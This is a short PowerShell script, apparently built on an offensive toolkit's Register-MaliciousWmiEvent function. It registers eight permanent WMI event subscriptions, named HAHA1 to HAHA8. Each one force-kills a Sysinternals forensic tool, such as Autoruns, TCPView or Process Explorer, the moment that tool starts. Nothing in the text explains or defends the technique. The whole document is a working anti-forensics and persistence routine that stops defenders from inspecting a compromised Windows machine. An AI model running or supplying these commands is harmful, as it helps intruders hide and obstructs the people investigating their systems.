Register-MaliciousWmiEvent -EventName HAHA1 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force `"" -Trigger ProcessStart -ProcessName autoruns.exe
Register-MaliciousWmiEvent -EventName HAHA2 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force `"" -Trigger ProcessStart -ProcessName autoruns64.exe
Register-MaliciousWmiEvent -EventName HAHA3 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force `"" -Trigger ProcessStart -ProcessName autorunsc.exe
Register-MaliciousWmiEvent -EventName HAHA4 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force `"" -Trigger ProcessStart -ProcessName autorunsc64.exe
Register-MaliciousWmiEvent -EventName HAHA5 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force `"" -Trigger ProcessStart -ProcessName tcpview.exe
Register-MaliciousWmiEvent -EventName HAHA6 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force `"" -Trigger ProcessStart -ProcessName tcpview64.exe
Register-MaliciousWmiEvent -EventName HAHA7 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force `"" -Trigger ProcessStart -ProcessName procexp.exe
Register-MaliciousWmiEvent -EventName HAHA8 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force `"" -Trigger ProcessStart -ProcessName procexp64.exe
